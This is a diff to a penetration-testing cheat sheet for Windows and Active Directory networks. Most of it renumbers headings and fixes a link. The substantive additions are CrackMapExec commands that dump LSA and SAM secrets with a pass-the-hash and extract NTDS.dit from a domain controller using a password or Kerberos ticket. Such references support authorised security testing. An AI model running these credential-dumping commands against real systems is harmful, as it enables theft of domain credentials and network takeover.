@@ -25,7 +25,7 @@ sudo ifconfig 10.11.12.13/24 && sudo ip route add default via <gateway_ip>
 
 ---
 
-##2. **No account yet**
+## 2. **No account yet**
 
 ### Physical access
 
@@ -118,11 +118,11 @@ Cain.exe (& Abel)
 
 ---
 
-## Unprivileged account only 
+## 3. **Unprivileged account only**
 
 ### Get a shell
 
-> For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypasss)
+> For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypass)
 
 ---
 
@@ -138,11 +138,15 @@ Cain.exe (& Abel)
 
 ---
 
-## **Local Admin account**
+## 4. **Local Admin account**
 
 ### Post-Exploitation
 
 > For more details, see next cheatsheet : [Local Privilege Escalation Windows](05-post-exploitation-windows.md)
+
+### Pivoting
+
+> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)
 
 ### Replay the secrets found
 
@@ -150,18 +154,20 @@ Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec
 
 ```bash
 crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
+crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --sam
 ```
-
-### Pivoting
-
-> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)
 
 ---
 
-## **Domain admin account**
+## 5. **Domain admin account**
 
 ### Dump NDTS.dit from DC
 
 ```bash
-cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
+# CrackMapExec using hash
+sudo cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
+
+# CrackMapExec using kerberos ticket
+export KRB5CCNAME=<user>.ccache 
+sudo cme smb <target> --kerberos --ntds
 ```
